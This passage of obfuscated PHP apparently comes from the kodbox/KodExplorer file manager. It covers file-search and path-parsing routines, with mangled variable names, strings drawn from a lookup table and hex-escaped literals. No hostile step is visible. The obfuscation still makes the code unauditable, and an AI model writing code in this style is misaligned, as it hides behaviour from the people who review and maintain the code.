$Ÿâ–ÍşÒ = $ïÉáğ[2242]; } $ûçàÜÚÍ = explode($ïÉáğ[50], trim($œ÷ŞÉ‡, $ïÉáğ[50])); return array($Ÿâ–ÍşÒ, $ûçàÜÚÍ); } public function listPathType($“Œ™ÓØ) { $øˆ¨•äÄ =& $_SERVER[²Ö÷öõ]; $‡¡çğÒŠ = $this->fileTypeWhere($“Œ™ÓØ); if (!$‡¡çğÒŠ) { return array(); } $ÖúÃ à‘ = USER_ID; $Õ•¦šö = Model($øˆ¨•äÄ[598])->getInfo($ÖúÃ à‘); $¡şæ“© = array($øˆ¨•äÄ[648] => SourceModel::TYPE_USER, $øˆ¨•äÄ[584] => array($øˆ¨•äÄ[612], $øˆ¨•äÄ[594] . $Õ•¦šö[$øˆ¨•äÄ[90]][$øˆ¨•äÄ[193]] . $øˆ¨•äÄ[613]), $øˆ¨•äÄ[649] => $ÖúÃ à‘, $øˆ¨•äÄ[646] => 0, $øˆ¨•äÄ[647] => $‡¡çğÒŠ); return $this->listSource($¡şæ“©); } public function listSearch($Öºıµ’¡, $¤ı»º¸ = 300) { $²‘òÒ× =& $_SERVER[²Ö÷öõ]; if (isset($Öºıµ’¡[$²‘òÒ×[2078]]) && $Öºıµ’¡[$²‘òÒ×[2078]]) { $Öºıµ’¡[$²‘òÒ×[2078]] = str_replace($²‘òÒ×[460], $²‘òÒ×[2243], trim($Öºıµ’¡[$²‘òÒ×[2078]])); } $ó©±ØëØ = $this->_parseSearchWhere($Öºıµ’¡); if (!isset($ó©±ØëØ[$²‘òÒ×[505]])) { $ó©±ØëØ[$²‘òÒ×[505]] = 0; } $ ûÍºá£ = $²‘òÒ×[2244]; $Å¡ƒİ’ = $ó©±ØëØ; $«Ø„¸Êİ = $ ûÍºá£; $this->_listSearchBindPinyin($Öºıµ’¡, $ó©±ØëØ, $ ûÍºá£); $this->alias($²‘òÒ×[519])->_makeOrder(); $ó©±ØëØ = $this->parseWhereLike($ó©±ØëØ); $Øò¾÷àõ = $this->distinct(!0)->field($ ûÍºá£)->where($ó©±ØëØ)->selectPage($¤ı»º¸); if ($GLOBALS[$²‘òÒ×[6]][$²‘òÒ×[457]][$²‘òÒ×[458]] && Input::check($Öºıµ’¡[$²‘òÒ×[2078]], $²‘òÒ×[655]) && $Øò¾÷àõ[$²‘òÒ×[442]][$²‘òÒ×[429]] == 1 && $Øò¾÷àõ[$²‘òÒ×[442]][$²‘òÒ×[443]] == 0) { $Øò¾÷àõ = $this->distinct(!0)->field($ ûÍºá£)->where($Å¡ƒİ’)->limit(1000)->select(); $Øò¾÷àõ = array_page_split($Øò¾÷àõ, !1, $¤ı»º¸); } $this->_listSearchFileContent($Øò¾÷àõ, $Öºıµ’¡, $«Ø„¸Êİ, $Å¡ƒİ’); $this->_listSearchDesc($Øò¾÷àõ, $Öºıµ’¡, $«Ø„¸Êİ); $this->_listSearchTag($Øò¾÷àõ, $Öºıµ’¡, $«Ø„¸Êİ); $this->_listSearchGroupTag($Øò¾÷àõ, $Öºıµ’¡, $«Ø„¸Êİ); $this->_listDataApply($Øò¾÷àõ[$²‘òÒ×[445]]); $this->_listMake($Øò¾÷àõ); return $Øò¾÷àõ; } private function _listSearchFileContent(&$™˜…ÛÂ, $˜åŞÑŒß, $í£ë’•, $¨õûîÈ) { $öÔ£´ß÷ =& $_SERVER[²Ö÷öõ]; if (!$˜åŞÑŒß[$öÔ£´ß÷[2078]] || $™˜…ÛÂ[$öÔ£´ß÷[442]][$öÔ£´ß÷[429]] > 1) { return; } if (!isset($¨õûîÈ[$öÔ£´ß÷[32]]) || !is_array($˜åŞÑŒß[$öÔ£´ß÷[541]])) { return; } $¨õûîÈ[$öÔ£´ß÷[541]] = array($öÔ£´ß÷[7], $˜åŞÑŒß[$öÔ£´ß÷[541]]); unset($¨õûîÈ[$öÔ£´ß÷[32]]); unset($˜åŞÑŒß[$öÔ£´ß÷[541]]); $´Øóê× = $this->field($í£ë’•)->where($¨õûîÈ)->limit($öÔ£´ß÷[2245])->select(); if (!$´Øóê× || count($´Øóê×) == 0) { return; } $™˜…ÛÂ[$öÔ£´ß÷[445]] = array_merge($´Øóê×, $™˜…ÛÂ[$öÔ£´ß÷[445]]); $™˜…ÛÂ[$öÔ£´ß÷[442]][$öÔ£´ß÷[443]] += count($´Øóê×); } private function _listSearchTag(&$áÍ¨æí¬, $Û¡ñµùÂ, $³¼‚Æ“») { $ÃÒ’ŸÙÁ =& $_SERVER[²Ö÷öõ]; if (!$Û¡ñµùÂ[$ÃÒ’ŸÙÁ[2078]] || $áÍ¨æí¬[$ÃÒ’ŸÙÁ[442]][$ÃÒ’ŸÙÁ[429]] > 1) { return; } $ïÅÕ¶ë† = Model($ÃÒ’ŸÙÁ[2246])->listData(); $ÃŞƒÅ¡ = array(); $¶»«¶øú = $Û¡ñµùÂ[$ÃÒ’ŸÙÁ[2078]]; foreach ($ïÅÕ¶ë† as $öÒœ‘) { $û™üÜ® = $öÒœ‘[$ÃÒ’ŸÙÁ[32]]; $ªŠ¦ß¢¥ = str_replace($ÃÒ’ŸÙÁ[53], $ÃÒ’ŸÙÁ[12], Pinyin::get($û™üÜ®)); if (stripos($û™üÜ®, $¶»«¶øú) !== !1 || stripos($ªŠ¦ß¢¥, $¶»«¶øú) !== !1) { $ÃŞƒÅ¡[] = $öÒœ‘[$ÃÒ’ŸÙÁ[475]]; } } if (!$ÃŞƒÅ¡) { return; } $è¡—Ê¹Ç = array($ÃÒ’ŸÙÁ[500] => array($ÃÒ’ŸÙÁ[7], $ÃŞƒÅ¡), $ÃÒ’ŸÙÁ[1780] => USER_ID); $ÈåÓÛ¬À = Model($ÃÒ’ŸÙÁ[502])->field($ÃÒ’ŸÙÁ[87])->where($è¡—Ê¹Ç)->select(); $ÈåÓÛ¬À = array_to_keyvalue($ÈåÓÛ¬À, $ÃÒ’ŸÙÁ[12], $ÃÒ’ŸÙÁ[87]); $·èúìñ° = array_unique($ÈåÓÛ¬À); $this->_listSearchMerge($áÍ¨æí¬, $Û¡ñµùÂ, $³¼‚Æ“», $·èúìñ°); } private function _listSearchDesc(&$Ö¶½‰ÙÂ, $àêğ¹ì, $òÚ«‰Äò) { $Ò·Æî›® =& $_SERVER[²Ö÷öõ]; if (!$àêğ¹ì[$Ò·Æî›®[2078]] || $Ö¶½‰ÙÂ[$Ò·Æî›®[442]][$Ò·Æî›®[429]] > 1) { return; } $™…ÌÌà = array($Ò·Æî›®[97] => $Ò·Æî›®[526], $Ò·Æî›®[450] => array($Ò·Æî›®[459], $Ò·Æî›®[2080] . $àêğ¹ì[$Ò·Æî›®[2078]] . $Ò·Æî›®[2080])); $‚ŠÖ™ÑŒ = !1; if ($‚ŠÖ™ÑŒ) { $ß¸úÔ¹  = $this->listSearchChildren($àêğ¹ì[$Ò·Æî›®[192]]); $ß¸úÔ¹  = array_unique($ß¸úÔ¹ ); if (!$ß¸úÔ¹ ) { return; } $™…ÌÌà[$Ò·Æî›®[193]] = array($Ò·Æî›®[7], $ß¸úÔ¹ ); } $ÇÑ“î©… = Model($Ò·Æî›®[632])->field($Ò·Æî›®[193])->where($™…ÌÌà)->limit(5000)->select(); $ÇÌáä¼é = array_to_keyvalue($ÇÑ“î©…, $Ò·Æî›®[12], $Ò·Æî›®[193]); $this->_listSearchMerge($Ö¶½‰ÙÂ, $àêğ¹ì, $òÚ«‰Äò, $ÇÌáä¼é); } private function _listSearchGroupTag(&$úŸàœíÉ, $¨îĞü¦Ã, $‘™‚¬Ç‚) { $Ì­û½˜  =& $_SERVER[²Ö÷öõ]; if (!$¨îĞü¦Ã[$Ì­û½˜ [2078]] || $úŸàœíÉ[$Ì­û½˜ [442]][$Ì­û½˜ [429]] > 1 || !$¨îĞü¦Ã[$Ì­û½˜ [192]]) { return; } $óüš†¸â = $this->sourceInfo($¨îĞü¦Ã[$Ì­û½˜ [192]]); if (!$óüš†¸â || $óüš†¸â[$Ì­û½˜ [190]] != SourceModel::TYPE_GROUP) { return; } $åÍ‰¤·œ = $óüš†¸â[$Ì­û½˜ [569]]; $ß°°¢÷à = Model($Ì­û½˜ [2247])->get($åÍ‰¤·œ); $×ü ˜¯› = array(); $¨ğçœ‰­ = $¨îĞü¦Ã[$Ì­û½˜ [2078]]; foreach ($ß°°¢÷à[$Ì­û½˜ [445]] as $¶·–ŒÒ) { $ü÷œÕ­£ = $¶·–ŒÒ[$Ì­û½˜ [32]]; $İøº€€× = str_replace($Ì­û½˜ [53], $Ì­û½˜ [12], Pinyin::get($ü÷œÕ­£)); if (stripos($ü÷œÕ­£, $¨ğçœ‰­) !== !1 || stripos($İøº€€×, $¨ğçœ‰­) !== !1) { $×ü ˜¯›[] = $¶·–ŒÒ[$Ì­û½˜ [475]]; } } if (!$×ü ˜¯›) { return; } $¾›è‘æ = array($Ì­û½˜ [500] => array($Ì­û½˜ [7], $×ü ˜¯›), $Ì­û½˜ [1780] => 0, $Ì­û½˜ [33] => $Ì­û½˜ [2100] . $åÍ‰¤·œ); $ÃÓ Õêú = Model($Ì­û½˜ [502])->field($Ì­û½˜ [87])->where($¾›è‘æ)->select(); $ÃÓ Õêú = array_to_keyvalue($ÃÓ Õêú, $Ì­û½˜ [12], $Ì­û½˜ [87]); $çàˆ® = array_unique($ÃÓ Õêú); $this->_listSearchMerge($úŸàœíÉ, $¨îĞü¦Ã, $‘™‚¬Ç‚, $çàˆ®); } private function _listSearchMerge(&$ˆ’¥ãÈÊ, $Èğñµò¨, $±’âé™å, $å¯šğ) { $Ô¤ˆ²ø¸ =& $_SERVER[²Ö÷öõ]; if (!$å¯šğ) { return; } $½è…ë­ü = array_to_keyvalue($ˆ’¥ãÈÊ[$Ô¤ˆ²ø¸[445]], $Ô¤ˆ²ø¸[12], $Ô¤ˆ²ø¸[193]); $¦”£†á = array_diff($å¯šğ, $½è…ë­ü); if (!$¦”£†á) { return; } $¢ø¶çº = array($Ô¤ˆ²ø¸[193] => array($Ô¤ˆ²ø¸[7], $¦”£†á)); $ì¯×éÚ = $this->field($±’âé™å)->where($¢ø¶çº)->select(); if (!$ì¯×éÚ) { return; } $œùŠ¯ŸĞ = array(); foreach ($ì¯×éÚ as $ ²Ï¡¨) { if ($this->_listSearchFilter($ ²Ï¡¨, $Èğñµò¨)) { $œùŠ¯ŸĞ[] = $ ²Ï¡¨; } } $ˆ’¥ãÈÊ[$Ô¤ˆ²ø¸[445]] = array_merge($œùŠ¯ŸĞ, $ˆ’¥ãÈÊ[$Ô¤ˆ²ø¸[445]]); $ˆ’¥ãÈÊ[$Ô¤ˆ²ø¸[442]][$Ô¤ˆ²ø¸[443]] += count($œùŠ¯ŸĞ); } private function _listSearchFilter($şåÉÛÔ, $Şç¤åÄà) { $¼áÄĞãà =& $_SERVER[²Ö÷öõ]; $Ú—×¨ê¢ = $şåÉÛÔ[$¼áÄĞãà[485]] == $¼áÄĞãà[91]; if (!strstr($şåÉÛÔ[$¼áÄĞãà[584]], $¼áÄĞãà[50] . $Şç¤åÄà[$¼áÄĞãà[192]] . $¼áÄĞãà[50])) { return !1; } if (isset($Şç¤åÄà[$¼áÄĞãà[486]]) && $Şç¤åÄà[$¼áÄĞãà[486]] != $¼áÄĞãà[859]) { if ($Şç¤åÄà[$¼áÄĞãà[486]] == $¼áÄĞãà[78] && !$Ú—×¨ê¢) { return !1; } if ($Şç¤åÄà[$¼áÄĞãà[486]] != $¼áÄĞãà[78] && $Ú—×¨ê¢) { return !1; } if (!strstr($şåÉÛÔ[$¼áÄĞãà[169]], $¼áÄĞãà[50] . $Şç¤åÄà[$¼áÄĞãà[486]] . $¼áÄĞãà[50])) { return !1; } } if (isset($Şç¤åÄà[$¼áÄĞãà[2248]]) && $Şç¤åÄà[$¼áÄĞãà[2248]] < $şåÉÛÔ[$¼áÄĞãà[79]]) { return !1; } if (isset($Şç¤åÄà[$¼áÄĞãà[2249]]) && $Şç¤åÄà[$¼áÄĞãà[2249]] > $şåÉÛÔ[$¼áÄĞãà[79]]) { return !1; } if (isset($Şç¤åÄà[$¼áÄĞãà[662]]) && $Şç¤åÄà[$¼áÄĞãà[662]] != $şåÉÛÔ[$¼áÄĞãà[529]]) { return !1; } return !0; } public function listSearchChildren($©Â›Ùõ, $ßúÇÂ«Ã = 5000) { $ˆƒÒ©ş‰ =& $_SERVER[²Ö÷öõ]; $ı„¤Òõ° = array(); $›û£÷¤½ = $this->sourceInfo($©Â›Ùõ); $¤ÂÎ“ = array($ˆƒÒ©ş‰[584] => array($ˆƒÒ©ş‰[459], $›û£÷¤½[$ˆƒÒ©ş‰[584]] . $›û£÷¤½[$ˆƒÒ©ş‰[193]] . $ˆƒÒ©ş‰[613])); $¸¨£³¹ = $this->field($ˆƒÒ©ş‰[79])->where($¤ÂÎ“)->limit($ßúÇÂ«Ã + 1)->select(); $ªˆú¶ = is_array($¸¨£³¹) ? count($¸¨£³¹) : 0; if ($ªˆú¶ > $ßúÇÂ«Ã) { return $this->_listSearchChildrenNear($©Â›Ùõ, $ßúÇÂ«Ã); } $ú˜ÁÜñ = $this->field($ˆƒÒ©ş‰[193])->where($¤ÂÎ“)->select(); $ı„¤Òõ° = array_to_keyvalue($ú˜ÁÜñ, $ˆƒÒ©ş‰[12], $ˆƒÒ©ş‰[193]); return $ı„¤Òõ°; } private function _listSearchChildrenNear($È°ëá, $ıªùÏª‹) { $§ï±åŸ =& $_SERVER[²Ö÷öõ]; $‚ÛßüÙã = array(); $ÙÛğ¶À¦ = array($§ï±åŸ[192] => $È°ëá); $ÆìÈ€Ñ¿ = $this->field($§ï±åŸ[2250])->where($ÙÛğ¶À¦)->select(); $¥ÔÅÊ…Ó = array_to_keyvalue(array_filter_by_field($ÆìÈ€Ñ¿, $§ï±åŸ[485], $§ï±åŸ[91]), $§ï±åŸ[12], $§ï±åŸ[193]); $‚ÛßüÙã = array_merge($‚ÛßüÙã, array_to_keyvalue($ÆìÈ€Ñ¿, $§ï±åŸ[12], $§ï±åŸ[193])); if (!$¥ÔÅÊ…Ó) { return $‚ÛßüÙã; } $ÙÛğ¶À¦ = array($§ï±åŸ[192] => array($§ï±åŸ[7], $¥ÔÅÊ…Ó)); $ÆìÈ€Ñ¿ = $this->field($§ï±åŸ[2250])->where($ÙÛğ¶À¦)->limit($ıªùÏª‹)->select(); $‚ÛßüÙã = array_merge($‚ÛßüÙã, array_to_keyvalue($ÆìÈ€Ñ¿, $§ï±åŸ[12], $§ï±åŸ[193])); $‚ÛßüÙã = array_slice($‚ÛßüÙã, 0, intval($ıªùÏª‹)); return $‚ÛßüÙã; } private function _listSearchBindPinyin($öøß¯³ú, &$íÚ¨Ñ“‘, &$ñ‡¾¯ÉÙ) { $ËŞƒ¯é´ =& $_SERVER[²Ö÷öõ]; if (!isset($öøß¯³ú[$ËŞƒ¯é´[2078]]) || !$öøß¯³ú[$ËŞƒ¯é´[2078]]) { return; } if (!Input::check($öøß¯³ú[$ËŞƒ¯é´[2078]], $ËŞƒ¯é´[394]) || strlen($öøß¯³ú[$ËŞƒ¯é´[2078]]) < 2) { return; } $À±ùŸá = "\114\x45\106\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x69\157\x5f\163\157\165\x72\x63\145\137\155\145\x74\x61\x20\155\145\164\x61\40\x6f\x6e\x20\x73\x6f\165\162\x63\x65\56\163\157\165\x72\x63\x65\x49\x44\x20\x3d\40\x6d\145\164\141\56\163\157\165\162\x63\x65\111\x44"; $ÀÈä³™ = array(); $ñ‡¾¯ÉÙ = str_replace(array($ËŞƒ¯é´[262], $ËŞƒ¯é´[53], $ËŞƒ¯é´[2251]), $ËŞƒ¯é´[12], $ñ‡¾¯ÉÙ); $ñ‡¾¯ÉÙ = $ËŞƒ¯é´[511] . str_replace($ËŞƒ¯é´[50], $ËŞƒ¯é´[512], $ñ‡¾¯ÉÙ); $Ì“‹æÚ§ = $íÚ¨Ñ“‘[$ËŞƒ¯é´[32]]; unset($íÚ¨Ñ“‘[$ËŞƒ¯é´[32]]); foreach ($íÚ¨Ñ“‘ as $ÇÍÀ¨ª± => $É’Ì¯£Ø) { $ÀÈä³™[$ËŞƒ¯é´[511] . $ÇÍÀ¨ª±] = $É’Ì¯£Ø; } foreach ($Ì“‹æÚ§ as $Œ¦Î®èì) { $ÀÈä³™[] = array($ËŞƒ¯é´[516] => $Œ¦Î®èì, $ËŞƒ¯é´[1086] => $ËŞƒ¯é´[2082], array($ËŞƒ¯é´[2252] => $Œ¦Î®èì, $ËŞƒ¯é´[2253] => array($ËŞƒ¯é´[7], array($ËŞƒ¯é´[538], $ËŞƒ¯é´[537])))); } $this->join($À±ùŸá); $íÚ¨Ñ“‘ = $ÀÈä³™; } private function _parseSearchWhere($§ôÕçÁä) { $ş«üÆ– =& $_SERVER[²Ö÷öõ]; $ìĞ£¯Àõ = array(); if (isset($§ôÕçÁä[$ş«üÆ–[843]]) && $§ôÕçÁä[$ş«üÆ–[843]]) { $ìĞ£¯Àõ[$ş«üÆ–[88]] = array($ş«üÆ–[2254], $§ôÕçÁä[$ş«üÆ–[843]]); } if (isset($§ôÕçÁä[$ş«üÆ–[844]]) && $§ôÕçÁä[$ş«üÆ–[844]]) { $Ã÷Ğ¯½Ù = array($ş«üÆ–[2255], $§ôÕçÁä[$ş«üÆ–[844]]); if ($ìĞ£¯Àõ[$ş«üÆ–[88]]) { $ìĞ£¯Àõ[$ş«üÆ–[88]] = array($ìĞ£¯Àõ[$ş«üÆ–[88]], $Ã÷Ğ¯½Ù, $ş«üÆ–[2256]); } else { $ìĞ£¯Àõ[$ş«üÆ–[88]] = $Ã÷Ğ¯½Ù; } } if (isset($§ôÕçÁä[$ş«üÆ–[2248]]) && $§ôÕçÁä[$ş«üÆ–[2248]] > 0) { $ìĞ£¯Àõ[$ş«üÆ–[79]] = array($ş«üÆ–[2254], $§ôÕçÁä[$ş«üÆ–[2248]]); } if (isset($§ôÕçÁä[$ş«üÆ–[2249]]) && $§ôÕçÁä[$ş«üÆ–[2249]]) { $Ã÷Ğ¯½Ù = array($ş«üÆ–[2255], $§ôÕçÁä[$ş«üÆ–[2249]]); if ($ìĞ£¯Àõ[$ş«üÆ–[79]]) { $ìĞ£¯Àõ[$ş«üÆ–[79]] = array($ìĞ£¯Àõ[$ş«üÆ–[79]], $Ã÷Ğ¯½Ù, $ş«üÆ–[2256]); } else { $ìĞ£¯Àõ[$ş«üÆ–[79]] = $Ã÷Ğ¯½Ù; } } if (isset($§ôÕçÁä[$ş«üÆ–[662]]) && $§ôÕçÁä[$ş«üÆ–[662]]) { $ìĞ£¯Àõ[] = array($ş«üÆ–[529] => $§ôÕçÁä[$ş«üÆ–[662]], $ş«üÆ–[527] => $§ôÕçÁä[$ş«üÆ–[662]], $ş«üÆ–[1086] => $ş«üÆ–[2082]); } if (isset($§ôÕçÁä[$ş«üÆ–[486]]) && $§ôÕçÁä[$ş«üÆ–[486]]) { $ÉÛŸÙ = $§ôÕçÁä[$ş«üÆ–[486]]; if ($ÉÛŸÙ == $ş«üÆ–[78]) { $ìĞ£¯Àõ[$ş«üÆ–[485]] = 1; } else { if ($ÉÛŸÙ == $ş«üÆ–[2257]) { $ìĞ£¯Àõ[$ş«üÆ–[485]] = 0; } else { if ($ÉÛŸÙ) { $ÉÛŸÙ = is_array($ÉÛŸÙ) ? $ÉÛŸÙ : explode($ş«üÆ–[50], $ÉÛŸÙ); $ìĞ£¯Àõ[$ş«üÆ–[486]] = array($ş«üÆ–[492], $ÉÛŸÙ); $ìĞ£¯Àõ[$ş«üÆ–[485]] = 0; } } } } $this->_parseSearchParent($§ôÕçÁä, $ìĞ£¯Àõ); if (isset($§ôÕçÁä[$ş«üÆ–[2078]]) && trim($§ôÕçÁä[$ş«üÆ–[2078]])) { $ÂÒÖºØù = trim($§ôÕçÁä[$ş«üÆ–[2078]]); $ÚÚıà²ƒ = explode($ş«üÆ–[53], $ÂÒÖºØù); if (strlen($ÂÒÖºØù) > 2 && (substr($ÂÒÖºØù, 0, 1) == $ş«üÆ–[121] && substr($ÂÒÖºØù, -1) == $ş«üÆ–[121]) || substr($ÂÒÖºØù, 0, 1) == $ş«üÆ–[58] && substr($ÂÒÖºØù, -1) == $ş«üÆ–[58]) { $ÂÒÖºØù = substr($ÂÒÖºØù, 1, -1); $ÚÚıà²ƒ = array($ÂÒÖºØù); } $ìĞ£¯Àõ[$ş«üÆ–[32]] = array(array($ş«üÆ–[612], $ş«üÆ–[2080] . $ÂÒÖºØù . $ş«üÆ–[2080])); if (count($ÚÚıà²ƒ) > 1) { $ìĞ£¯Àõ[$ş«üÆ–[32]] = array(); foreach ($ÚÚıà²ƒ as $ˆÎÛ§Ëê) { if (!trim($ˆÎÛ§Ëê)) { continue; } $ìĞ£¯Àõ[$ş«üÆ–[32]][] = array($ş«üÆ–[612], $ş«üÆ–[2080] . trim($ˆÎÛ§Ëê) . $ş«üÆ–[2080]); } } } return $ìĞ£¯Àõ; } private function _parseSearchParent($µ¥ÍÔÌ, &$›µ³ ¯) { $µå©±éŒ =& $_SERVER[²Ö÷öõ]; if (!isset($µ¥ÍÔÌ[$µå©±éŒ[192]]) || !$µ¥ÍÔÌ[$µå©±éŒ[192]]) { return; } $¥øƒ¾Û = $this->pathInfo($µ¥ÍÔÌ[$µå©±éŒ[192]]); $Æß „ïÌ = $¥øƒ¾Û[$µå©±éŒ[192]] . $µå©±éŒ[12] === $µå©±éŒ[228]; $ı•¯‘— = $¥øƒ¾Û[$µå©±éŒ[190]] == $µå©±éŒ[578]; if ($¥øƒ¾Û[$µå©±éŒ[595]] == $µå©±éŒ[596]) { $¥îÈ‹»È = $this->sourceInfo($µ¥ÍÔÌ[$µå©±éŒ[192]]); $¥øƒ¾Û[$µå©±éŒ[584]] = $¥îÈ‹»È[$µå©±éŒ[584]]; } $›µ³ ¯[$µå©±éŒ[652]] = array($µå©±éŒ[612], $¥øƒ¾Û[$µå©±éŒ[584]] . $µ¥ÍÔÌ[$µå©±éŒ[192]] . $µå©±éŒ[613]); $‰•‡İ×ˆ = isset($µ¥ÍÔÌ[$µå©±éŒ[1938]]) && in_array($µå©±éŒ[578], $µ¥ÍÔÌ[$µå©±éŒ[1938]]); if (!$‰•‡İ×ˆ || !$ı•¯‘— || !$Æß „ïÌ || !$¥øƒ¾Û[$µå©±éŒ[487]]) { return; } if (!AuthModel::authCheckRoot($¥øƒ¾Û[$µå©±éŒ[487]][$µå©±éŒ[488]])) { return; } $º—À¦Æ = $¥øƒ¾Û[$µå©±éŒ[569]] . $µå©±éŒ[12]; if ($º—À¦Æ == $µå©±éŒ[91]) { unset($›µ³ ¯[$µå©±éŒ[652]]); $›µ³ ¯[$µå©±éŒ[190]] = self::TYPE_GROUP; return; } $™âœå = Model($µå©±éŒ[585])->groupChildrenAll($º—À¦Æ); $Ü¹¦éË = count($™âœå); if ($Ü¹¦éË <= 1) { return; } $¶ç±ßİê = array($µå©±éŒ[192] => 0, $µå©±éŒ[190] => self::TYPE_GROUP, $µå©±éŒ[569] => array($µå©±éŒ[7], $™âœå)); $Ì¨¶½ò¬ = $this->field($µå©±éŒ[2258])->where($¶ç±ßİê)->limit($Ü¹¦éË)->select(); $›µ³ ¯[$µå©±éŒ[652]] = array(); foreach ($Ì¨¶½ò¬ as $òõƒÉ¯¨) { $›µ³ ¯[$µå©±éŒ[652]][] = array($µå©±éŒ[612], $µå©±éŒ[594] . $òõƒÉ¯¨[$µå©±éŒ[193]] . $µå©±éŒ[613]); } $›µ³ ¯[$µå©±éŒ[652]][] = $µå©±éŒ[2082]; } } goto b°²Æè‘; CŠï‰Ğ´¯Ø: class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\162\x52\x65\x63\171\x63\154\145\175"; const KOD_USER_FAV = "\x7b\165\163\145\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\162\x46\151\x6c\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\x46\151\x6c\x65\124\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\x75\160\122\x6f\157\164\123\145\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\x72\x53\x68\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\162\123\x68\x61\x72\145\114\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\x72\x65\x54\157\x4d\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\x65\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\173\x73\x68\141\x72\145\111\164\145\x6d\114\151\156\x6b\175"; const KOD_SEARCH = "\173\x73\145\141\x72\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\154\x6f\143\x6b\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\145\x72\x52\145\x6e\x63\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\145\162\175"; public static function typeList() { $ÈïÙÈõ =& $_SERVER[²Ö÷öõ]; return array($ÈïÙÈõ[1346] => self::KOD_SOURCE, $ÈïÙÈõ[1347] => self::KOD_USER_RECYCLE, $ÈïÙÈõ[1348] => self::KOD_USER_FAV, $ÈïÙÈõ[1349] => self::KOD_USER_FILE_TAG, $ÈïÙÈõ[1350] => self::KOD_USER_FILE_TYPE, $ÈïÙÈõ[1351] => self::KOD_GROUP_ROOT_SELF, $ÈïÙÈõ[1352] => self::KOD_USER_SHARE, $ÈïÙÈõ[1353] => self::KOD_USER_SHARE_LINK, $ÈïÙÈõ[1354] => self::KOD_USER_SHARE_TO_ME, $ÈïÙÈõ[1355] => self::KOD_SHARE_ITEM, $ÈïÙÈõ[1356] => self::KOD_SHARE_LINK, $ÈïÙÈõ[1357] => self::KOD_SEARCH, $ÈïÙÈõ[1358] => self::KOD_BLOCK, $ÈïÙÈõ[1359] => self::KOD_IO, $ÈïÙÈõ[1360] => self::KOD_USER_RECENT, $ÈïÙÈõ[1361] => self::KOD_USER_DRIVER); } public static function parse($§Ö§ñ¸Õ) { $¦«¾ê =& $_SERVER[²Ö÷öõ]; $§Ö§ñ¸Õ = self::clear($§Ö§ñ¸Õ); $®èº×å„ = array_values(self::typeList()); preg_match($¦«¾ê[1362], $§Ö§ñ¸Õ, $ÑëÙöîê); $‡úÀÊ• = array($¦«¾ê[496] => !1, $¦«¾ê[1363] => !1, $¦«¾ê[493] => !1, $¦«¾ê[87] => $§Ö§ñ¸Õ, $¦«¾ê[1259] => !1, $¦«¾ê[1258] => $¦«¾ê[12]); if (is_array($ÑëÙöîê) && count($ÑëÙöîê) == 5) { $ïô›Şıª = $¦«¾ê[1364] . $ÑëÙöîê[2] . $¦«¾ê[403]; if (in_array($ïô›Şıª, $®èº×å„)) { $‡úÀÊ•[$¦«¾ê[1259]] = $ÑëÙöîê[1]; $‡úÀÊ•[$¦«¾ê[33]] = $ïô›Şıª; $‡úÀÊ•[$¦«¾ê[1365]] = substr($ïô›Şıª, 1, -1); $‡úÀÊ•[$¦«¾ê[475]] = $ÑëÙöîê[3]; } $‡úÀÊ•[$¦«¾ê[1258]] = $ÑëÙöîê[4]; } $ºá¤Èù = array($¦«¾ê[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $‡úÀÊ•[$¦«¾ê[1328]] = in_array($‡úÀÊ•[$¦«¾ê[33]], $ºá¤Èù); return $‡úÀÊ•; } public static function isTruePath($¨×©½¦’) { $ÓšÄËøü =& $_SERVER[²Ö÷öõ]; if (substr($¨×©½¦’, 0, 1) != $ÓšÄËøü[1364]) { return !0; } if (strpos($¨×©½¦’, $ÓšÄËøü[483]) === 0) { return !0; } if (strpos($¨×©½¦’, $ÓšÄËøü[1332]) === 0) { return !0; } if (strpos($¨×©½¦’, $ÓšÄËøü[1366]) === 0) { return !0; } if (strpos($¨×©½¦’, $ÓšÄËøü[1367]) === 0) { return !0; } if (strpos($¨×©½¦’, $ÓšÄËøü[1368]) === 0) { return !0; } return !1; } public static function clear($”âÓáİç) { $³¸Ø÷ =& $_SERVER[²Ö÷öõ]; $”âÓáİç = str_replace(array($³¸Ø÷[1165], $³¸Ø÷[262]), $³¸Ø÷[53], $”âÓáİç); $”âÓáİç = str_replace($³¸Ø÷[100], $³¸Ø÷[8], $”âÓáİç); $¹êÊè› = $³¸Ø÷[1369]; if (substr($”âÓáİç, 0, 3) == $³¸Ø÷[1370]) { $”âÓáİç = substr($”âÓáİç, 3); } while (strstr($”âÓáİç, $¹êÊè›)) { $”âÓáİç = str_replace($¹êÊè›, $³¸Ø÷[8], $”âÓáİç); } $”âÓáİç = preg_replace($³¸Ø÷[1371], $³¸Ø÷[8], $”âÓáİç); if ($”âÓáİç == $³¸Ø÷[8]) { return $³¸Ø÷[8]; } $”âÓáİç = rtrim($”âÓáİç, $³¸Ø÷[8]); return $”âÓáİç; } public static function pathTrue($á×È†Õó) { $Òğâ¿ËÁ =& $_SERVER[²Ö÷öõ]; if (!$á×È†Õó) { return $Òğâ¿ËÁ[12]; } $á×È†Õó = str_replace($Òğâ¿ËÁ[592], $Òğâ¿ËÁ[8], str_replace($Òğâ¿ËÁ[1372], $Òğâ¿ËÁ[8], $á×È†Õó)); $á×È†Õó = str_replace($Òğâ¿ËÁ[592], $Òğâ¿ËÁ[8], str_replace($Òğâ¿ËÁ[1372], $Òğâ¿ËÁ[8], $á×È†Õó)); if (!strstr($á×È†Õó, $Òğâ¿ËÁ[1370])) { return $á×È†Õó; } $¹°¼•Çª = explode($Òğâ¿ËÁ[8], 